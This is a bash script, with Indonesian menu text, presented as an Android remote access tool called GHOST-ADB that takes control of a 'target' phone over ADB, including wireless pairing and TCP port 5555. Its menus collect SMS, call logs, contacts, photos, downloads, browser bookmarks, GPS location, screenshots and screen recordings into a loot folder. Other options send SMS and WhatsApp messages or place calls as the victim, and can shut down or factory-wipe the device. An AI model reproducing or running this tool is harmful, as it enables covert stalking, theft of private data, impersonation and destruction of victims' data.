#!/bin/bash

# =================================================================
# GHOST-ADB OMNIPOTENCE v25.0 (SISTEM PEMANEN JIWA - FULL VERSION)
# BY GHOST_ROOT | ZERO-FLICKER | FULL TCP | COMPLETE EXPLOIT
# =================================================================

RED="\e[1;31m"; GREEN="\e[1;32m"; YELLOW="\e[1;33m"
BLUE="\e[1;34m"; MAGENTA="\e[1;35m"; CYAN="\e[1;36m"
WHITE="\e[1;37m"; RESET="\e[0m"; BOLD="\e[1m"; GRAY="\e[1;90m"

BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_DIR="$BASE_DIR/.config_adb"; LOOT_DIR="$BASE_DIR/ADB_LOOT"
CACHE_FILE="$CONFIG_DIR/devices.cache"; TCP_CACHE="$CONFIG_DIR/tcp_ip.cache"
mkdir -p "$CONFIG_DIR" "$LOOT_DIR"

tput civis

recon_target() {
    if adb get-state 1>/dev/null 2>&1; then
        MODEL=$(adb shell getprop ro.product.model 2>/dev/null | tr -d '\r')
        ANDROID_VER=$(adb shell getprop ro.build.version.release 2>/dev/null | tr -d '\r')
        BATT=$(adb shell dumpsys battery 2>/dev/null | grep "level" | awk '{print $2}' | tr -d '\r')
        PKGS=$(adb shell pm list packages 2>/dev/null)
        if echo "$PKGS" | grep -q "com.whatsapp.w4b"; then WA_TYPE="WA Business"; WA_PKG="com.whatsapp.w4b"
        elif echo "$PKGS" | grep -q "com.whatsapp"; then WA_TYPE="WA Standar"; WA_PKG="com.whatsapp"
        else WA_TYPE="N/A"; WA_PKG=""; fi
        if adb shell su -c 'id' >/dev/null 2>&1; then ROOT_S="${GREEN}ROOTED${RESET}"; else ROOT_S="${RED}NON-ROOT${RESET}"; fi
        CONNECTED=true
    else
        CONNECTED=false
    fi
}

header() {
    tput reset
    echo -e "${RED}${BOLD}"
    cat << "EOF"
           uuuuuuu
       uu$$$$$$$$$$$uu
    uu$$$$$$$$$$$$$$$$$uu
   u$$$$$$$$$$$$$$$$$$$$$u
  u$$$$$$$$$$$$$$$$$$$$$$$u
  u$$$$$$$$$$$$$$$$$$$$$$$u
  u$$$$$$"   "$$$"   "$$$$u
  "$$$$"      u$u       "$$$"
   $$$u       u$u       u$$$
   $$$u      u$$$u      u$$$
    "$$$$uu$$$   $$$uu$$$$"
     "$$$$$$$"   "$$$$$$$"
       u$$$$$$$u$$$$$$$u
        u$"$"$"$"$"$"$u
         $$u$u$u$u$u$$
          $$$$$$$$$$$
           "$$$$$$$"
 GHOST-ADB | RAT-ANDROID
  ═══════════════════════════════════════
EOF
    if [ "$CONNECTED" = true ]; then
        echo -e " TARGET : ${CYAN}$MODEL (A$ANDROID_VER)${RESET} | $ROOT_S"
        echo -e " POWER  : ${GREEN}$BATT%${RESET} | WA: ${YELLOW}$WA_TYPE${RESET}"
    else
        echo -e " ${RED}${BOLD}    [ ○ ] MENUNGGU JIWA TERHUBUNG... [ ○ ]${RESET}"
    fi
    echo -e "${RED}  ═══════════════════════════════════════${RESET}"
}

trap 'tput cnorm; exit' INT

menu_otomatis() {
    while true; do
        recon_target; header
        echo -e " ${CYAN}[ PENGAWASAN MENDALAM ]${RESET}"
        echo -e "  1. Sedot Semua SMS          8. Curi Koordinat GPS"
        echo -e "  2. Sedot Riwayat Panggilan  9. Pantau Logcat (Live)"
        echo -e "  3. Sedot Kontak Target     10. Daftar Akun Sosial"
        echo -e "  4. Lacak IP & Jaringan     14. DNA Perangkat Lengkap"
        echo -e "  7. Cari File (PDF/Doc)     11. Riwayat Browser (Chrome)"
        echo -e ""
        echo -e " ${CYAN}[ MANIPULASI SOSIAL ]${RESET}"
        echo -e "  15. Paksa Buka WhatsApp    16. Ketik Pesan WA Otomatis"
        echo -e "  18. Matikan Layanan WA     20. Paksa YT/TikTok"
        echo -e "  22. SMS Blast (Injeksi)    23. Panggilan Suara Jarak Jauh"
        echo -e ""
        echo -e " ${CYAN}[ PENYADAPAN MULTIMEDIA ]${RESET}"
        echo -e "  25. Tangkapan Layar        26. Rekam Layar (15 Detik)"
        echo -e "  30. Sedot Galeri Foto      31. Sedot Folder Download"
        echo -e ""
        echo -e " ${CYAN}[ SIKSA SISTEM ]${RESET}"
        echo -e "  35. Mirror Layar (Scrcpy)  37. Injeksi Teks Jarak Jauh"
        echo -e "  50. Matikan HP Seketika    51. Paksa Reboot"
        echo -e "  53. Nyalakan Senter        54. HAPUS SEMUA DATA (WIPE)"
        echo -e ""
        echo -e " ${RED}0. KEMBALI KE KEGELAPAN${RESET}"
        tput cnorm; read -p " ghost@kali-neraka › " OPT; tput civis

        [ "$OPT" = "0" ] && break
        DIR_NAME="${MODEL// /_}_$(date +%Y%m%d)"
        FINAL_LOOT="$LOOT_DIR/$DIR_NAME"; mkdir -p "$FINAL_LOOT"

        case $OPT in
            1) adb shell content query --uri content://sms/ > "$FINAL_LOOT/sms.txt" ;;
            2) adb shell content query --uri content://call_log/calls > "$FINAL_LOOT/calls.txt" ;;
            3) adb shell content query --uri content://com.android.contacts/data > "$FINAL_LOOT/kontak.txt" ;;
            4) adb shell ip addr show wlan0 ;;
            7) adb shell "find /sdcard/ -name '*.pdf' -o -name '*.docx'" ;;
            8) adb shell dumpsys location | grep "last location" ;;
            9) adb logcat *:V ;;
            10) adb shell dumpsys account ;;
            11) adb shell "content query --uri content://com.android.chrome.browser/bookmarks" > "$FINAL_LOOT/chrome.txt" ;;
            14) adb shell getprop ;;
            15) [ ! -z "$WA_PKG" ] && adb shell monkey -p $WA_PKG 1 ;;
            16) read -p "No: " N; read -p "Msg: " M; MSG_U="${M// /%20}"
                adb shell am start -a android.intent.action.VIEW -d "https://wa.me/$N?text=$MSG_U" ;;
            18) [ ! -z "$WA_PKG" ] && adb shell am force-stop $WA_PKG ;;
            20) read -p "1. YT / 2. TT: " S; [ "$S" == "1" ] && adb shell monkey -p com.google.android.youtube 1 || adb shell monkey -p com.zhiliaoapp.musically 1 ;;
            22) read -p "No: " N; read -p "Msg: " M; adb shell am start -a android.intent.action.SENDTO -d sms:$N --es sms_body "$M" ;;
            23) read -p "No: " N; adb shell am start -a android.intent.action.CALL -d tel:$N ;;
            25) TS=$(date +%H%M%S); adb shell screencap -p /sdcard/s.png && adb pull /sdcard/s.png "$FINAL_LOOT/scr_$TS.png" ;;
            26) adb shell screenrecord --time-limit 15 /sdcard/r.mp4 && adb pull /sdcard/r.mp4 "$FINAL_LOOT/" ;;
            30) adb pull /sdcard/DCIM/Camera/ "$FINAL_LOOT/Photos/" ;;
            31) adb pull /sdcard/Download/ "$FINAL_LOOT/" ;;
            35) scrcpy --always-on-top ;;
            37) read -p "Teks: " T; T_E="${T// /%s}"; adb shell input text "$T_E" ;;
            50) adb shell reboot -p ;;
            51) adb shell reboot ;;
            53) adb shell "su -c 'echo 255 > /sys/class/leds/flashlight/brightness'" ;;
            54) echo -e "${RED}WIPE DATA? (y/n)${RESET}"; read -p "> " Y; [ "$Y" == "y" ] && adb shell am broadcast -a android.intent.action.MASTER_CLEAR ;;
        esac
        echo -e "\n${GREEN}[ SELESAI ]${RESET} - Enter..."; read
    done
}

while true; do
    recon_target; header
    echo -e " 1) ⚡ CONNECT CACHE       5) 🔄 RESET ADB"
    echo -e " 2) 🔐 PAIRING (A11+)      6) 📡 SWITCH TCP 5555"
    echo -e " 3) 💀 GHOST COMMANDS      7) 🔗 CONNECT DIRECT TCP"
    echo -e " 4) 🐚 MANUAL VOID SHELL   q) EXIT"
    tput cnorm; read -p " ghost@kali-neraka › " M; tput civis
    case $M in
        1) T=$(tail -n 1 "$CACHE_FILE" 2>/dev/null); [ ! -z "$T" ] && adb connect "$T" ;;
        2) read -p "IP: " IP; read -p "P-Port: " PP; read -p "Code: " PC; read -p "D-Port: " DP
           echo "$PC" | adb pair "$IP:$PP" && adb connect "$IP:$DP"
           echo "$IP:$DP" > "$CACHE_FILE"; echo "$IP" > "$TCP_CACHE" ;;
        3) [ "$CONNECTED" = true ] && menu_otomatis || sleep 1 ;;
        4) adb shell ;;
        5) adb kill-server && adb start-server ;;
        6) adb tcpip 5555 ;;
        7) R_IP=$(cat "$TCP_CACHE" 2>/dev/null); adb connect "$R_IP:5555" ;;
        q) tput cnorm; exit 0 ;;
    esac
done
